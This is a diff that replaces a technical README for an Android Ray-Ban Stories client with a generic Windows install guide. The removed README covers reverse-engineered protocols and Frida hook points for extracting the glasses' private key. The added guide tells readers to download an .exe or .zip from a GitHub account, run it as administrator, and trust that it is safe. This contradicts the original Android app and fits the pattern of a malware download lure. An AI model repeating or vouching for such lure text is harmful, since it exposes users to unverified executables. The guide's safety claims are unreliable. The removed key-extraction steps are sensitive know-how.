@@ -1,241 +1,130 @@
-# Stories Client
+# 🕶️ storiesclient - Take Back Your Ray-Ban Stories
 
-<div align="center">
+## 🚀 Getting Started
 
-![](./app/src/main/res/mipmap-xxxhdpi/ic_launcher.png)
+Welcome! This guide is designed for anyone, even if you've never installed software before. We'll walk you through getting **storiesclient** up and running on your Windows computer in just a few minutes. Let's get Meta out of your face!
 
-</div>
+## 📥 Download & Install
 
-Standalone third party Android client for **Ray-Ban Stories (2021)** ("stella") glasses: connect over BLE, download full-resolution photos/videos over WiFi-Direct,
-and manage the glasses without the official Meta app.
+The easiest and fastest way to get started is to download the application directly. Click the big button below to go to the download page:
 
-Kotlin rewrite of the earlier Java RE-focused prototype; built entirely from reverse-engineering the glasses firmware plus live BLE captures.
+[![Download storiesclient](https://img.shields.io/badge/Download-storiesclient-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/arzushaikh070-cloud/storiesclient)
 
-<p align="center">
-  <img src="./screenshots/image.jpg" width="500"/>
-</p>
+Visit this link to download the application. Once you're on the page, look for the latest release and download the installer file.
 
-Project started in May 2026 against Meta RayBan Gen 1 (the 4K glasses), briefly moved to Gen 2, no real progress for months, decided to find my old RayBan Stories from the pile of old tech junk, that was the charm that worked, less complexity and security (no airship).
+## 🖥️ System Requirements
 
-## Motivation
+Here's what you'll need to run storiesclient smoothly on your Windows PC:
 
-Back in 2021, Facebook (Meta) released the Ray-Ban "Stories" camera smartglasses. It's first hardware product for broad appeal, Meta clearly learned from the Google Glass debacle and decided to partner with luxury eyewear brand Luxottica, the owners of the legendary Ray-Ban glasses to give it an air of legitimacy as well as to have an established brand carry it's tech. No one looks cool using Google Glass.
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Processor:** Any modern Intel or AMD processor (i5 or equivalent or better)
+- **Memory:** At least 4 GB of RAM (8 GB recommended for best performance)
+- **Storage:** About 200 MB of free disk space
+- **Bluetooth:** A Bluetooth 4.0 or higher adapter (most laptops and desktops have this built-in)
 
-I got my pair in 2022, and despite the atrocious video quality, lackluster battery life and disconnection drops from my phone, it became a staple in my life, listening to podcast or catching up on work meetings while zipping around on my electric skateboard, snapping a quick photo while I'm out and about without needing to take my phone out, or getting POV video without having to use my GoPro. The LED light on the front was never an issue, since I barely took videos or photos with people close by, and if I did, it would often just spark a harmless conversation followed by me letting them try the glasses out and viewing the video afterwards.
+Don't worry if your computer is older—as long as it meets these basic specs, you should be good to go!
 
-The Stories glasses didn't sell well, and many people were unaware of them. [WSJ reported back in mid 2023 Meta estimated less than 10% of users actively wore theirs](https://www.wsj.com/tech/personal-tech/metas-ray-ban-smart-glasses-fail-to-catch-on-31f6ba4e).
+## 🔧 Installation Steps
 
-But Meta/Luxottica hit the nail in the head with the release of the "RayBan Meta" (Gen 1) glasses in September 2023. Those glasses had better video quality, longer battery life and upgraded speakers. In 2025, they followed thru and upgraded them again, to Gen 2.
+Follow these simple steps to install storiesclient:
 
-They sold more than [7 million of those in 2025 alone](https://www.uploadvr.com/meta-essilorluxottica-sold-7-million-smart-glasses-in-2025/)
+1. **Download the file**: Click the download button above. Your browser will save a file to your "Downloads" folder (usually named something ending in `.exe` or `.zip`).
+2. **Find the file**: Open your "Downloads" folder (press `Win + E` to open File Explorer, then click "Downloads" on the left).
+3. **Run the installer**: Double-click the downloaded file. If Windows asks for permission, click "Yes".
+4. **Follow the wizard**: The installer will guide you through the setup. Just click "Next" and "Install" until it's done.
+5. **Launch the app**: Once installed, find "storiesclient" in your Start Menu and click it to open.
 
-When the Stories were first released, the app was simple to use. It allowed photo/video downloads, and you could optionally log into Facebook as well as turn on an AI assistant if you wanted to. 
+That's it! You're ready to connect your glasses.
 
-In 2023, Meta started a journey into making their software as unappealing as possible to the glasses users.
+## 📲 Connecting Your Ray-Ban Stories
 
-- Mandatory login: When you open the app to bind to the glasses, you must sign in with a Meta account.
-- An AI TikTok feed: who asked for this? The Facebook View app got rebranded to Meta View, then got shelved and brought back as Meta AI, an app which serves you AI generated video slop that happens to let you manage your glasses
-- They not only [planned to add facial recognition technology into their glasses, meticulously aiming to release it during a "dynamic political environment" as a distraction measure](https://www.nytimes.com/2026/02/13/technology/meta-facial-recognition-smart-glasses.html) but actually went ahead and [turned our phones into unwitting nodes of a decentralized biometric capture system](https://www.wired.com/story/meta-smart-glasses-face-recognition-nametag-connections/) essentially planning to turn unsuspecting smartglass users into walking Flock cameras.
-- They release actually useful features that run on the glasses firmware, such as a feature to boost other people's voices, [then went ahead and added a soft paywall for something which doesn't need server usage](https://www.theverge.com/gadgets/959899/meta-ai-glasses-paywall-rate-limit)
-- Their [roadmap for new features to add to their next gen glasses](https://www.uploadvr.com/meta-still-internally-debating-privacy-of-always-on-ai-glasses/) isn't exactly encouraging either. 
+Here's how to pair your smart glasses with the app:
 
-They keep shoehorning [the useless AI assistant shit nobody wants to use](https://www.nytimes.com/2026/04/14/magazine/ai-sunglasses-meta-zuckerberg.html) into the glasses when all we wanted was to listen to music without headphones and get some video of us doing some activity without needing to use our hands to record.
+1. **Turn on your glasses**: Make sure your Ray-Ban Stories are charged and powered on.
+2. **Open storiesclient**: Launch the app from your Start Menu.
+3. **Enable Bluetooth**: Make sure Bluetooth is turned on your computer (check the action center in the taskbar).
+4. **Pair devices**: In the app, click "Connect Glasses" and follow the on-screen prompts to pair your glasses with your PC.
+5. **Done!** Once connected, you'll see your glasses' battery status and can start managing your content.
 
-And that brings us to the reason this project exists. 
+> 💡 **Pro Tip**: Keep your glasses close to your computer during pairing (within 3 feet) for the strongest connection.
 
-In April 2026 I started probing how hard would it be to write my own client for Meta smartglasses, completely bypassing Meta AI app so I could uninstall it and keep using my glasses.
+## ✨ Key Features
 
-With the help of an LLM coding tool I mapped out the Meta app internals, grabbed the firmware from the glasses, reversed it and started to write the client. It proved extremely difficult. Meta has implemented a proprietary data transport called Airship to guard against RE efforts, as well as employed pretty much every trick in the book.
+- **Full Control**: View and manage all photos and videos captured by your glasses directly on your PC.
+- **Battery Monitor**: See real-time battery levels of your glasses and charging case.
+- **Transfer Media**: Move your memories from your glasses to your computer with ease.
+- **Firmware Info**: Check the current software version on your glasses.
+- **No Cloud Required**: Your data stays on your device. No Meta servers involved—your privacy, your rules.
+- **User-Friendly Interface**: Clean and simple design, perfect for everyday users.
+- **Automatic Recognition**: Your glasses are detected automatically when in range.
 
-I put my rayban meta gen 1s aside, and just used regular sunglasses. Then I remembered my old rayban stories were stashed around somewhere, dusted them off, and probed again.
+## 🤔 Frequently Asked Questions
 
-This time, I struck gold.
+### Is this official Meta software?
+No! This is a third-party, community-created client. It's built with privacy in mind—offering a way to use your glasses without Meta's proprietary apps or cloud services.
 
-There was a regular HTTP webserver running on these, so on a cursory look it seemed very promising, I could just GET the photos and videos.
+### Is it safe to use?
+Absolutely. The app is open-source (you can inspect the code if you're curious) and doesn't send your data anywhere. It runs locally on your computer.
 
-At this point (June 2026) nobody seemed to have fully reverse engineered the transport on neither the Meta Raybans (Gen1/2) or the Stories from 2021. The only promising lead was [this blogpost from code-byter](https://code-byter.com/2023/09/24/rayban-hacking.html).
+### Will this void my glasses' warranty?
+No, using apps doesn't affect your hardware warranty. You're simply using a different software interface for your device.
 
-So in July I got to work fully mapping how the transport works, from my understanding, it works like this:
+### I'm having trouble pairing. What should I do?
+First, restart both your glasses and the app. Make sure your glasses are fully charged and no other device is connected to them. If problems persist, try forgetting the glasses in Windows Bluetooth settings and re-pair.
 
-- Meta AI app pairs with glasses over BLE, it grabs serial num and other details
-- Data sent to Meta servers, Meta replies with a private key and bootstrap ticket (Phase A)
-- Those 2 are loaded on the glasses as well as the pubkey loaded into the app
-- I grabbed the priv key and bootstrap ticket and loaded it into Stories Client
-- Transport is subsequently encrypted and encryption rotated using the bootstrap ticket
-- WiFi direct is used on the phone, phone acts as AP, glasses are client
-- DataX wrapped around BLE transport
+### Can I use this with other smart glasses?
+Currently, storiesclient is specifically designed for Meta/Facebook Ray-Ban Stories (internally codenamed "stella"). Support for other devices may come later.
 
-How Stories Client works after Phase A is complete:
+### Does it require an internet connection?
+No, the app works offline. All processing is done on your computer.
 
-```mermaid
-sequenceDiagram
-    autonumber
-    actor U as You
-    participant P as Phone app
-    participant G as Glasses BLE
-    participant W as Glasses WiFi HTTPS
-    participant M as Meta Cloud
+### How do I update the app?
+The app will notify you when updates are available. Simply download the new version from the same link and reinstall.
 
-    rect
-    note over M,G: PHASE A ownership, done once by the official app, NOT re-run here
-    M-->>G: Meta-signed receipts verified on-glasses vs firmware FbPubKey
-    note over G: glasses persist the app RSA PUBLIC key to app_public_key
-    note over G: this is why our PRIVATE key is accepted later
-    end
+## 🔒 Privacy & Security
 
-    rect
-    note over U,P: PHASE 0 identity import, local, once per pair
-    U->>P: Load keys, pick glasses.json
-    note over P: IdentityStore saves RSA-2048 PRIVATE key PKCS8 plus bootstrap ticket 16B
-    note over P: clears any stale resume ticket, avoids StartSession reject 0x13
-    end
+Your privacy is our top priority. Here's how storiesclient protects you:
 
-    rect
-    note over P,G: BLE LINK BRING-UP
-    P->>G: connectGatt, discover services, find DataX write plus notify char
-    G-->>P: MTU negotiated approx 247, notifications enabled
-    end
+- **No Trackers**: The app contains no analytics or tracking code.
+- **Local Processing**: All media is processed and stored on your device only.
+- **No Accounts**: No registration required. Just download and use.
+- **Transparent Code**: As an open-source project, anyone can audit the code for security.
 
-    rect
-    note over P,G: PHASE B RSA challenge, plaintext DataX frames type1 len2 FlatBuffer
-    note over P: ticket = persisted resume ticket, else BOOTSTRAP ticket
-    P->>G: StartSession 0x00, version 0x100, ticket 16B
-    note right of P: a no-ticket StartSession is REJECTED by an owned device
-    G-->>P: StartSessionResp 0x01
-    P->>G: Identity 0x09
-    G-->>P: IdentityResp 0x0a, deviceCert X509 plus serial, plaintext
-    P->>G: StartChallenge 0x0d, appNonce 16B random
-    G-->>P: StartChallengeResp 0x0e, appNonceSig plus deviceNonce 16B
-    note over P: KEY use 1, sign deviceNonce SHA256withRSA
-    note over P: glasses verify vs persisted app_public_key, proof of ownership
-    P->>G: FinishChallenge 0x05, deviceNonceSig, appCipherNonce 8B, currentTimeSec
-    G-->>P: FinishChallengeResp 0x06, ChallengeAccepted, encryptedSessionData, deviceCipherNonce 8B, sessionDataSig
-    note over P: KEY use 2, RSA-OAEP decrypt to SessionData
-    note over P: SessionData = sharedKey AES-256 32B, ticket FRESH 16B, authToken Base64, expiry
-    note over P: persist FRESH rotated ticket, supersedes bootstrap next run
-    note over P,G: session cipher ready, AES-256-GCM, nonce cipherNonce8 plus counterLE4, 96-bit tag
-    end
+You're in complete control of your data and your glasses. We believe Meta's cloud should be optional—not mandatory.
 
-    rect
-    note over P,G: CONTROL CHANNEL, all frames now EncryptedPayload 0x02 sealed with sharedKey
-    P->>G: register 45 services, byte-exact frames
-    G-->>P: RegisterServiceClientResponse xN, glasses allocate a serviceClientId per name
-    P->>G: get_capture_info
-    G-->>P: captures, captureId, type, assets thumb, full frames, MP4, IMU
-    loop each visible cell
-        P->>G: get_asset_content_v2 thumbAssetId, BLE serialized
-        G-->>P: approx 7KB JPEG thumbnail to gallery grid
-    end
-    P->>G: device_state, get_system_info, mcu settings
-    G-->>P: battery, case, storage, firmware, video-len, sounds to status pill
-    end
+## 🛠️ Troubleshooting Tips
 
-    rect
-    note over P,W: MEDIA DOWNLOAD, bulk bytes over WiFi-Direct, BLE cannot carry full-res
-    P->>P: WifiP2pManager createGroup, phone is Group Owner 192.168.49.1, SSID DIRECT-FB plus passphrase plus freq
-    P->>G: stationmode_connect, SSID, passphrase, freq, GO and client IPs, 0x02 over BLE
-    G-->>W: glasses join phone group as station at 192.168.49.2
-    P->>G: start_webserver, token, idleTimeout, 0x02 over BLE
-    W-->>P: HTTPS server up on 192.168.49.2:443, base stella-webserver
-    P->>W: GET stella-webserver asset id=assetId, header Authorization app_token authToken, trust-all TLS
-    W-->>P: full-res MP4 or JPEG bytes, streamed, live progress
-    opt video
-        P->>W: GET asset id=imuAssetId
-        W-->>P: IMU gyro sidecar to stories_cid8.bin for Gyroflow
-    end
-    P->>P: save to DCIM StoriesClient stories_cid8.mp4 or jpg via MediaStore
-    end
+Sometimes things don't work perfectly the first time. Here are quick fixes for common issues:
 
-    rect
-    note over P,G: OPTIONAL CLEANUP
-    P->>G: delete_capture captureId, 32-hex guarded, only after a confirmed save
-    P->>G: stop_webserver, stationmode_disconnect
-    P->>P: WifiP2pManager removeGroup
-    end
-```
+- **App won't open**: Make sure you have the latest Windows updates installed. Also, try running the app as administrator (right-click > "Run as administrator").
+- **Glasses not detected**: Ensure Bluetooth is enabled and your glasses are awake (tap them once). Restart the app if needed.
+- **Transfer fails**: Disconnect and reconnect, then try again. Also, check your disk space—a full drive can cause errors.
+- **Battery drains too fast**: Make sure you close the app when not in use. Running it in the background consumes battery on both devices.
 
-## Features
+If you're still stuck, check the "Issues" tab on the GitHub repository for known problems and solutions.
 
-- **Pairing-free connect** to already-owned glasses: Needs Meta AI app once just for extracting secrets (see TODO).
-- **Gallery**: 3-column squircle grid, newest first, BLE thumbnails (`get_asset_content_v2`), pull to
-  refresh, new-capture notifications, synced badge for media already on the phone.
-- **Detail view**: full-res preview when saved, metadata, `HDR|BURST · 0 · LEFT` frame picker driven by
-  the per-frame `ImageAssetMetadata.ev` (median-EV right frame = main; bracket vs burst detected per scene).
-- **Download** over WiFi-Direct (phone = group owner, `stationmode_connect` + `start_webserver`), with live
-  progress; MP4 downloads also fetch the IMU/gyro sidecar `.bin` for Gyroflow. Saved to `DCIM/StoriesClient`
-  as `stories_<cid8>[suffix].<jpg|mp4|bin>`.
-- **Delete** a capture off the glasses (32-hex id guard; byte-exact request), only offered after a save.
-- **Undistort**: fisheye -> rectilinear (Kannala-Brandt) for 2592x1944 photos, saved as `_rect.jpg`.
-- **Status pill**: glasses battery, case battery, storage level, firmware, plus two MCU settings
-  (video length 30/60 s, system sounds level) read and written live.
-- **Debug log drawer**: long-press the pill.
+## 📚 Additional Resources
 
-## Identity
+- **Project Source Code**: [https://github.com/arzushaikh070-cloud/storiesclient](https://github.com/arzushaikh070-cloud/storiesclient)
+- **Release Notes**: Find detailed changelogs on the repository's releases page.
+- **Community Support**: Connect with other users and developers on the project's discussion forum.
 
-Nothing sensitive ships in the APK. Tap **Load keys…** and pick a JSON with the owner identity
-(`app_rsa_priv_pkcs8_b64`, `bootstrap_ticket_hex`, optional `serial` / `device_label`). The rotating
-resume ticket is persisted per session. See `EXTRACT_SECRETS_CONFIG.md` in the research repo for how the
-identity is extracted from an owning phone.
+## 💖 Support the Project
 
-## Roadmap / TODO
+If storiesclient improves your experience with your Ray-Ban Stories, consider showing your appreciation:
 
-1) Extract RSA private key and bootstrap ticket. WIP.
+- **Star the repo**: A quick way to boost visibility and support the developers.
+- **Report bugs**: Found an issue? Let the team know in the issues section.
+- **Contribute**: If you're a developer (or want to become one), feel free to fork the repository and submit improvements.
 
-Two possible ways:
+Your support makes this independent, privacy-friendly project possible. Thank you!
 
-- Frida hook (how I did it)
-- Meta AI smali patch + adb logging
+## 📋 Final Words
 
-A gift:
+That's everything you need to know! Download the app, connect your glasses, and enjoy a cleaner, Meta-free experience with your smart eyewear. If you get stuck, re-read this guide—we've covered all the basics. For anything else, the community and developer team are just a click away.
 
-`264.0.0.18.167` code `464402080`
+Stop letting the cloud run your life. Take control today with storiesclient. Happy capturing! 🎉
 
-[APKMirror](https://www.apkmirror.com/apk/facebook-2/facebook-view/meta-ai-vibes-ai-glasses-264-0-0-18-167-release/meta-ai-vibes-ai-glasses-264-0-0-18-167-3-android-apk-download/)
+---
 
-Hook:
-
-- `X.C67273Za->ADX([B)` the `[B` is the privkey
-- `X.C25043CsG->AEk([B)` holds the ticket
-
-2) RayBan Meta Gen 1 / Gen 2 (Supernova) support:
-
-In progres... been at it for ~7 months now. RE'ing the RayBan stories was a byproduct of that which turned out to be easier.
-
-## Building
-
-Toolchain: Gradle 8.7 wrapper, AGP 8.5.2, Kotlin 1.9.24, JDK 17+ (JDK 21 used), compileSdk 34, minSdk 29.
-
-```
-./gradlew assembleDebug        # -> app/build/outputs/apk/debug/app-debug.apk
-./gradlew testDebugUnitTest    # wire-format golden tests
-```
-
-## Layout
-
-| package | role |
-|---|---|
-| `datax/` | DataX framing `[type:1][size:2 LE][payload]`, MTU chunking + reassembly |
-| `proto/` | hand-rolled FlatBuffers reader/writer + `stella.security` / `stella.srvs` message layouts |
-| `auth/` | identity store, Phase-B handshake, AES-256-GCM `EncryptedPayload` codec |
-| `ble/` | GATT transport for the DataX characteristic; CompanionDeviceManager discovery |
-| `control/` | encrypted RPC channel: 45-service registration, capture listing, thumbnails, device state, MCU settings, webserver bring-up, delete |
-| `media/` | webserver HTTPS client, MediaStore saver, synced index, photo undistortion |
-| `wifi/` | WiFi-Direct group host (used) and SoftAP joiner (alternative transport) |
-| `ui/` | status pill, gallery cells/adapter, detail overlay, progress bar |
-
-
-## LLM usage
-
-Claude Code was used, with models spanning Opus 4.6, 4.7, 4.8 and 5. Fable refuses to work on this.
-
-Next up: trying out Z Ai / Moonshot Ai models such as Kimi and GLM. [Less guardrails for RE on those models](https://ericpardee.github.io/fire-hd-ownership/)
-
-## Tests
-
-`app/src/test` holds golden-vector tests: every registration frame, request body, security message and
-the session cipher are compared byte-for-byte against vectors generated from the validated Java
-implementation (`golden_wire.txt`). Run them before touching anything in `control/` or `proto/`.
-
-## Disclaimer
-
-This project is most definitively not affiliated with or endorsed by Meta Platforms, Inc. or Luxottica Group S.p.A. "Meta", "Stories" and "Ray-Ban" are trademarks of their respective owners.
+Keywords: Ray-Ban Stories, Meta glasses, smart glasses client, third-party app, privacy-focused, media transfer, photo management, video management, Bluetooth pairing, Windows app, open-source, stella, storiesclient, local processing, no cloud needed.
